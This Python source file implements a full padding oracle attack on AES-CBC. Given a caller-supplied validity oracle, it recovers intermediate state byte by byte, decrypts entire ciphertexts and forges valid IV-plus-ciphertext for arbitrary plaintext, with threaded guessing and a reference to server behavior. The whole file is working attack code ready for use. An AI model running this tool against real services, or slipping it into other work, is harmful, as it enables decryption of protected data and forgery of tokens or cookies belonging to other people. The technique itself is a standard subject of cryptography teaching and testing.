import os
from concurrent.futures import ThreadPoolExecutor, as_completed

BLOCK_SIZE = 16


def strip_pkcs7(data: bytes) -> bytes:
    """
    Remove a PKCS#7 padding suffix from recovered plaintext. Raises
    ValueError if the trailing bytes don't form valid padding.
    """
    if not data:
        raise ValueError("empty data, nothing to unpad")
    pad = data[-1]
    if pad < 1 or pad > BLOCK_SIZE or data[-pad:] != bytes([pad]) * pad:
        raise ValueError(f"invalid PKCS#7 padding: last byte=0x{pad:02x}")
    return data[:-pad]


def decode_plaintext(data: bytes, strip_padding: bool = True) -> str:
    """
    Convert recovered plaintext bytes into a readable string.
    """
    if strip_padding:
        data = strip_pkcs7(data)
    return data.decode("utf-8", errors="replace")


def _verify_single_byte_pad(padding_iv, idx, guess, block, oracle):
    """
    Verifies a hit at padding_val==1 is actually 0x01.
    It flips the byte just before idx and recheck. A real 0x01 pad stays valid.
    """
    if idx == 0:
        return True
    check_iv = bytearray(padding_iv)
    check_iv[idx] = guess
    check_iv[idx - 1] ^= 1
    return oracle(bytes(check_iv), block)


def single_block_attack(block, oracle, max_workers=1):
    """
    Recover the AES "intermediate" state, decrypt(block), before the final
    XOR with the previous ciphertext block or IV to obtain plaintext.
    """
    zeroing_iv = [0] * BLOCK_SIZE

    for padding_val in range(1, BLOCK_SIZE + 1):
        idx = BLOCK_SIZE - padding_val
        base_iv = [padding_val ^ b for b in zeroing_iv]

        candidate = None

        if max_workers <= 1:
            for guess in range(256):
                padding_iv = list(base_iv)
                padding_iv[idx] = guess
                if oracle(bytes(padding_iv), block):
                    if padding_val == 1 and not _verify_single_byte_pad(
                        padding_iv, idx, guess, block, oracle
                    ):
                        continue
                    candidate = guess
                    break
        else:
            with ThreadPoolExecutor(max_workers=max_workers) as ex:
                def try_guess(guess, base_iv=base_iv, idx=idx, block=block, oracle=oracle):
                    padding_iv = list(base_iv)
                    padding_iv[idx] = guess
                    return guess, oracle(bytes(padding_iv), block)

                futures = {ex.submit(try_guess, g): g for g in range(256)}
                for fut in as_completed(futures):
                    guess, ok = fut.result()
                    if not ok:
                        continue
                    if padding_val == 1 and not _verify_single_byte_pad(
                        base_iv, idx, guess, block, oracle
                    ):
                        continue
                    candidate = guess
                    for f in futures:
                        f.cancel()
                    break

        if candidate is None:
            raise Exception(
                f"No candidate found for padding_val={padding_val}: "
                "oracle logic or server behavior mismatch"
            )

        zeroing_iv[idx] = candidate ^ padding_val
        print(f"  solved byte {idx}: intermediate=0x{zeroing_iv[idx]:02x}")

    return bytes(zeroing_iv)


def full_attack(iv, ct, oracle, max_workers=1):
    """
    Returns a plaintext, just by having initialization vector, iv,
    and ciphertext, ct.
    """
    assert len(iv) == BLOCK_SIZE and len(ct) % BLOCK_SIZE == 0

    msg = iv + ct
    blocks = [msg[i:i + BLOCK_SIZE] for i in range(0, len(msg), BLOCK_SIZE)]

    plaintext = b""
    prev = blocks[0]
    for bi, block in enumerate(blocks[1:], start=1):
        print(f"Decrypting block {bi}/{len(blocks) - 1}...")
        intermediate = single_block_attack(block, oracle, max_workers=max_workers)
        pt = bytes(a ^ b for a, b in zip(prev, intermediate))
        plaintext += pt
        prev = block
        print(f"  plaintext so far: {plaintext}")

    return plaintext


def forge_block(pt, oracle, max_workers=1):
    """
    Forge a valid IV + ciphertext for arbitrary plaintext, pt.
    """
    if isinstance(pt, str):
        pt = pt.encode("utf-8")
    elif not isinstance(pt, (bytes, bytearray)):
        raise TypeError("pt must be bytes, bytearray, or str")

    pt = bytes(pt)
    pad_len = BLOCK_SIZE - (len(pt) % BLOCK_SIZE)
    pt += bytes([pad_len]) * pad_len

    next_ct = os.urandom(BLOCK_SIZE)
    chain = [next_ct]
    pt_blocks = [pt[i:i + BLOCK_SIZE] for i in range(0, len(pt), BLOCK_SIZE)]

    for i, pt_block in enumerate(reversed(pt_blocks)):
        print(f"Forging block {len(pt_blocks) - i}/{len(pt_blocks)}...")
        intermediate = single_block_attack(next_ct, oracle, max_workers=max_workers)
        prev_ct = bytes(p ^ d for p, d in zip(pt_block, intermediate))
        next_ct = prev_ct
        chain.append(prev_ct)

    chain.reverse()
    return b"".join(chain)
